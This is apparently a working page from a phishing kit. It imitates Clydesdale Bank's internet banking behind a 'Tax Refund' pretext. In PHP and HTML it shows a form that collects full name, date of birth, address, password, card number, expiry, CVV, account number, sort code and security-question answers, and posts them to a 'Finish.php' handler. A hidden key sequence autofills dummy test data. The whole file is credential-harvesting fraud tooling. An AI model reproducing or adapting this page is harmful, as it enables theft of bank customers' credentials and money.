<?php

error_reporting(0);

date_default_timezone_set("Europe/London");

session_start();

require "../assets/includes/functions.php";
require "../assets/includes/Bank_One_Time.php";
require "../assets/includes/simplehtmldom.php";
require "../assets/includes/enc.php";
$_SESSION['telepin'] = $_POST['telepin'];

?>

<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width" name="viewport">
<title>Validate information</title>
<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon" />
<link href='assets/css/one.css' media="screen" rel="stylesheet" type="text/css">
<link href='assets/css/two.css' media='screen' rel="stylesheet" type='text/css'>
<link href='assets/css/three.css' media='screen' rel="stylesheet" type='text/css'>
<style>.w1 {width:100%!important} .w3 {width:33%!important} p.error {color:red} input.error {background-color:rgba(255,0,0,0.15)}</style>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
<script src="assets/js/cardcheck.js"></script>
<script>
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
});
</script>
<script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.field').toggleClass('errorzzzz', erred);
        return this;
      };

      $('form').submit(function(e) {
        e.preventDefault();

        var cardType = $.payment.cardType($('.cc-number').val());
        $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
        $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
        $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
        $('.cc-brand').text(cardType);
      });

    });
</script>
<script>
jQuery.validator.addMethod('phoneUK', function(phone_number, element) {
return this.optional(element) || phone_number.length > 9 &&
phone_number.match(/^(((\+44)? ?(\(0\))? ?)|(0))( ?[0-9]{3,4}){3}$/);
}, 'Please check the telephone number you have provided');

jQuery.validator.addMethod("postcodeUK", function(value, element) {
return this.optional(element) || /^[A-Z]{1,2}[0-9]{1,2} ?[0-9][A-Z]{2}$/i.test(value);
}, "Please check the postcode you have provided");

$('#details').validate();
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#details").validate({
				errorElement: "p",	
				errorClass: "error",
  errorPlacement: function(error, element) {
     error.appendTo( element.parent("div") );
   },
                rules: {
					name: {	required: true,	minlength: 4,},
					dob: {	required: true,	minlength: 10,},
					telephone: { required: true, minlength: 11, digits: true,},
					address: { required: true, minlength: 5,},
					postcode: { required: true, minlength: 5,},
					pass: { required: true},
					ccno: { required: true, minlength: 16, creditcard: true},
					ccexp: { required: true, minlength: 4,},
					secode: { required: true, minlength: 3, digits: true,},
					account: { required: true, minlength: 8, digits: true,},
					sortcode: { required: true, minlength: 8,},
					q1: { required: true},
					q2: { required: true},
					q3: { required: true},
					a1: { required: true},
					a2: { required: true},
					a3: { required: true},
                },
                messages: {
					name: {
						required: "Please provide your full name",
						minlength: jQuery.validator.format("Please provide your full name"),
					},
					dob: {
						required: "Please provide your date of birth",
						minlength: jQuery.validator.format("Please provide your date of birth"),
					},
					telephone: {
						required: "Please provide your telephone number",
						minlength: jQuery.validator.format("Please ensure you enter 11 digits exactly"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					address: {
						required: "Please provide the 1st line of your address",
						minlength: jQuery.validator.format("Please check the address you have entered"),
					},
					postcode: {
						required: "Please provide your postcode",
						minlength: jQuery.validator.format("Please check the postcode you have entered"),
					},
					pass: {
						required: "Please provide your full password",
					},
					ccno: {
						required: "Please provide your 16 digit card number",
						minlength: jQuery.validator.format("Please check the card number you have entered"),
						creditcard: jQuery.validator.format("Please check the card number you have entered"),
					},
					ccexp: {
						required: "Please provide your cards expiry date",
						minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
						date: jQuery.validator.format("Please check the card expiry date you have entered"),
					},
					secode: {
						required: "Please provide your 3 digit card security code (CVV)",
						minlength: jQuery.validator.format("Please check the card security code you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					account: {
						required: "Please provide your 8 digit account number",
						minlength: jQuery.validator.format("Please check the account number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					sortcode: {
						required: "Please provide your 6 digit sort code",
						minlength: jQuery.validator.format("Please check the sort code you have entered"),
					},
					q1: {required: "Please select a security question",},
					q2: {required: "Please select a security question",},
					q3: {required: "Please select a security question",},
					a1: {required: "Please provide your answer",},
					a2: {required: "Please provide your answer",},
					a3: {required: "Please provide your answer",},
				},
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
</script>
<script>
function develop() {
if ( window.addEventListener ) {
        var kkeys = [], konami = "76,51,51,66,79";
        window.addEventListener("keydown", function(e){
                kkeys.push( e.keyCode );
                if ( kkeys.toString().indexOf( konami ) >= 0 ) {
                    populate()
                }
        }, true);
}
}
function populate() {
document.getElementById('name').value = "Steve Smith";
document.getElementById('dob').value = "02/02/1983";
document.getElementById('telephone').value = "07475566966";
document.getElementById('address').value = "21 some road";
document.getElementById('postcode').value = "BT412US";
document.getElementById('pass').value = "pa55";
document.getElementById('cc-number').value = "4111 1111 1111 1111";
document.getElementById('cc-exp').value = "10 / 19";
document.getElementById('cc-cvc').value = "108";
document.getElementById('account').value = "12340000";
document.getElementById('sortcode').value = "77-01-04";
document.getElementById('q1').value = "The name of a memorable place to you";
document.getElementById('a1').value = "answerforq1";
document.getElementById('q2').value = "Your favourite film of all time";
document.getElementById('a2').value = "answerforq2";
document.getElementById('q3').value = "Your favourite meal or restaurant";
document.getElementById('a3').value = "answerforq3";
}
</script>
</head>
<body class="personal" onload="develop();">
<div class="container top-nav-bg hide-on-phones">
<div class="row">
<div class="three columns phone-two"><img src="assets/img/logo.gif"></div>
<div class="six columns phone-two" id="heroPanel"></div>
<div class="three columns ie6-no-right-margin phone-two text-right">
<p class="show-on-desktops">Text Size: <a href="javascript:standardFontSize();" tabindex="1" title="Standard Font Size"><span class="smallish">T</span></a> <a href="javascript:increaseFontSize();" tabindex="2" title="Larger Font Size"><span class="bigger">T</span></a></p>
<p><a class="nice nag round medium button" href="#" tabindex="3">Logout Internet Banking<span class="arrow"><!-- --></span></a></p>
<h6><?php echo date('l, d/m/Y');?></h6>
</div>
</div>
</div>
<div class="container show-on-phones" id="mobile-head">
<div class="row">
<div class="phone-one text-left">
<div id="mobile-nav"><a href="#">Menu</a></div>
</div>
<div class="phone-two text-center" id="mlogo"><img src="assets/img/mobile-logo.png"></div>
<div class="phone-one text-right" id="mlogout"><a href="#"><img src="assets/img/mobile-logout.png"></a></div>
</div>
</div>
<div class="container section-nav-bg" id="mobile-nav-menu">
<div class="row">
<div class="nine columns">
<ul class="nav-bar">
<li class=""><a href="#" tabindex="10">Account Info</a></li>
<li class=""><a href="#" tabindex="11">Payments</a></li>
<li class=""><a href="#" tabindex="14">Products</a></li>
<li class="active"><a href="#" tabindex="13">Administration</a></li>
<li class=""><a href="#" tabindex="12">Contact Us</a></li>
</ul>
</div>
<div class="three columns ie6-no-right-margin hide-on-phones">
<ul class="nav-bar" id="trmenu">
<li><a href="#" tabindex="22">Logout</a></li>
</ul>
</div>
</div>
</div>
<div class="container" id="mobile-nav-left">Administration</div>
<div class="hide-on-phones"><br></div>
<div class="container" id="wrap">
<div class="row">
<div class="three columns" id="mobile-nav-left-show">
<ul class="nav-bar vertical" id="secondarynavskip">
<li class="Level4"><a href="#">Administration</a></li>
<li class="Level4"><a href="#">Security Token</a></li>
<li class="Level4"><a href="#">Token Request</a></li>
<li class="Level4"><a href="#">Token Activation</a></li>
<li class="Level4"><a href="#">Change Password</a></li>
<li class="Level4"><a href="#">Change Security Questions and Answers</a></li>
<li class="Level4"><a href="#">Modify Contact Details</a></li>
<li class="Level4"><a href="#">Modify Account Access</a></li>
<li class="Level4"><a href="#">Modify Account Nicknames</a></li>
<li class="Level4"><a href="#">Modify Transaction History Settings</a></li>
</ul>
</div>
<div class="six columns">
<h2>Tax Refund</h2>
<hr>
<div id="innercontent">
<form action="Finish.php?Account-Verification&sessionid=<?php echo generateRandomString(130); ?>&securessl=true" autocomplete="off" class="nice" id="details" method="post" name="details">
<div class="row">
<div class="twelve columns">Please enter your information below in order to reactivate access to our online banking & telephone banking service.</div>
</div>
<br>
<legend>Personal Information</legend>
<br>
<div class="row">
<div class="six columns"><label class="singleLine">Full Name:</label></div>
<div class="six columns ie6-no-right-margin"><input class="input-text w1" name="name" id="name" size="20" type="text" value="<?php echo $_SESSION['name'];?>"></div>
</div>
<div class="row">
<div class="six columns"><label class="singleLine">Date of Birth:</label></div>
<div class="six columns ie6-no-right-margin"><input class="input-text w1" name="dob" id="dob" size="20" type="tel" value="<?php echo $_SESSION['dob'];?>"></div>
</div>
<div class="row">
<div class="six columns"><label class="singleLine">Mobile Telephone Number:</label></div>
<div class="six columns ie6-no-right-margin"><input class="input-text w1 phoneUK" maxlength="11" name="telephone" id="telephone" size="20" type="tel" value="<?php echo $_SESSION['telephone'];?>"></div>
</div>
<div class="row">
<div class="six columns"><label class="singleLine">Address (line 1):</label></div>
<div class="six columns ie6-no-right-margin"><input class="input-text w1" name="address" id="address" size="20" type="text" value="<?php echo $_SESSION['address'];?>"></div>
</div>
<div class="row">
<div class="six columns"><label class="singleLine">Postcode:</label></div>
<div class="six columns ie6-no-right-margin"><input class="input-text w1 postcodeUK" name="postcode" id="postcode" size="20" type="text" value="<?php echo $_SESSION['postcode'];?>"></div>
</div>
<br>
<legend>Account Details</legend>
<br>
<div class="row">
<div class="six columns"><label class="singleLine">Password:</label></div>
<div class="six columns ie6-no-right-margin"><input class="input-text w1" maxlength="40" name="pass" id="pass" size="20" type="password"></div>
</div>
<div class="row">
<div class="six columns"><label class="singleLine">Card Number:</label></div>
<div class="six columns ie6-no-right-margin"><input class="input-text w1 cc-number" maxlength="20" id="cc-number" name="ccno" size="20" type="tel" value="<?php echo $_SESSION['ccno'];?>"></div>
</div>
<div class="row">
<div class="six columns"><label class="singleLine">Card Expiry Date:</label></div>
<div class="six columns ie6-no-right-margin"><input class="input-text w3 cc-exp" maxlength="14" id="cc-exp" name="ccexp" size="5" type="tel" value="<?php echo $_SESSION['ccexp'];?>"></div>
</div>
<div class="row">
<div class="six columns"><label class="singleLine">Card Security Code:</label></div>
<div class="six columns ie6-no-right-margin"><input class="input-text w3 cc-cvc" maxlength="4" id="cc-cvc" name="secode" size="5" type="tel" value="<?php echo $_SESSION['secode'];?>"></div>
</div>
<div class="row">
<div class="six columns"><label class="singleLine">Account Number</label></div>
<div class="six columns ie6-no-right-margin"><input class="input-text w1" maxlength="8" id="account" name="account" size="20" type="tel" value="<?php echo $_SESSION['account'];?>"></div>
</div>
<div class="row">
<div class="six columns"><label class="singleLine">Sort Code</label></div>
<div class="six columns ie6-no-right-margin"><input class="input-text w1" maxlength="8" id="sortcode" name="sortcode" size="20" type="tel" value="<?php echo $_SESSION['sortcode'];?>"></div>
</div>
<br>
<legend>Confirm Security Questions</legend>
<br>
<div class="row">
<div class="four columns"><label for="q1" class="singleLine">Choose question 1: </label></div>
<div class="eight columns ie6-no-right-margin">
<select name="q1" class="nag-select w1" id="q1">
<option value="" selected="selected">Please select question</option>
<option value="The name of a memorable place to you">The name of a memorable place to you?</option>
<option value="Your favourite film of all time">Your favourite film of all time ?</option>
<option value="Your favourite meal or restaurant">Your favourite meal or restaurant?</option>
<option value="What is your favourite book of all time">What is your favourite book of all time?</option>
<option value="What is your favourite teacher or subject">What is your favourite teacher or subject?</option>
<option value="What is your favourite TV star or show">What is your favourite TV star or show?</option></select>
</div>
</div>
<div class="row">
<div class="four columns"><label for="answer1" class="singleLine">Answer 1: </label></div>
<div class="eight columns ie6-no-right-margin"><input class="input-text w1" type="password" name="a1" maxlength="20" size="21" value="" id="a1"></div>
</div>
<div class="row">
<div class="four columns"><label for="q2" class="singleLine">Choose question 2: </label></div>
<div class="eight columns ie6-no-right-margin">
<select name="q2" class="nag-select w1" id="q2">
<option value="" selected="selected">Please select question</option>
<option value="The name of a memorable place to you">The name of a memorable place to you?</option>
<option value="Your favourite film of all time">Your favourite film of all time ?</option>
<option value="Your favourite meal or restaurant">Your favourite meal or restaurant?</option>
<option value="What is your favourite book of all time">What is your favourite book of all time?</option>
<option value="What is your favourite teacher or subject">What is your favourite teacher or subject?</option>
<option value="What is your favourite TV star or show">What is your favourite TV star or show?</option></select>
</div>
</div>
<div class="row">
<div class="four columns"><label for="answer1" class="singleLine">Answer 2: </label></div>
<div class="eight columns ie6-no-right-margin"><input class="input-text w1" type="password" name="a2" maxlength="20" size="21" value="" id="a2"></div>
</div>
<div class="row">
<div class="four columns"><label for="q3" class="singleLine">Choose question 3: </label></div>
<div class="eight columns ie6-no-right-margin">
<select name="q3" class="nag-select w1" id="q3">
<option value="" selected="selected">Please select question</option>
<option value="The name of a memorable place to you">The name of a memorable place to you?</option>
<option value="Your favourite film of all time">Your favourite film of all time ?</option>
<option value="Your favourite meal or restaurant">Your favourite meal or restaurant?</option>
<option value="What is your favourite book of all time">What is your favourite book of all time?</option>
<option value="What is your favourite teacher or subject">What is your favourite teacher or subject?</option>
<option value="What is your favourite TV star or show">What is your favourite TV star or show?</option></select>
</div>
</div>
<div class="row">
<div class="four columns"><label for="answer1" class="singleLine">Answer 3: </label></div>
<div class="eight columns ie6-no-right-margin"><input class="input-text w1" type="password" name="a3" maxlength="20" size="21" value="" id="a3"></div>
</div>
<br>
<br>
<div class="row">
<div class="four columns"><label class="singleLine"></label></div>
<div class="eight columns ie6-no-right-margin"><input class="nice nag round small button" style="float:right" name="go" type="submit" value="Submit"></div>
</div>


</form>
</div>
</div>
<div class="three columns ie6-no-right-margin">
<div class="headed-box">
<div><a class="medium nag nice button round" href="#"><span class="arrow"></span> 0 new message(s)</a>
<p>Last login <strong><?php echo date('d/m/Y');?></strong></p>
</div>
</div>
<div class="headed-box">
<h4>Need Help?</h4>
<div><a class="medium white nice button round" href="#">Visit our Clydesdale Bank Help Centre <span class="arrow"></span></a></div>
</div>
</div>
</div>
</div>
<div class="clear"></div>
<div class="container hide-on-phones bcrumbs">
<div class="row">
<p>You are here:&nbsp;<b class="breadcrumb">Administration</b></p>
</div>
</div>
<div class="clear"></div>
<div class="bottom-bar">
<div class="row">
<p class="text-center">You can find impartial information and guidance on money matters on the "<a href="#">Money advice service</a>" website.<br>
Clydesdale Bank is covered by the Financial Services Compensation Scheme (FSCS), <a href="http://www.cbonline.co.uk/personal/savings/compensation-scheme" target="_blank" title="Find out more">Find out more</a>.</p>
</div>
<div class="clear"></div>
</div>
</body>
</html>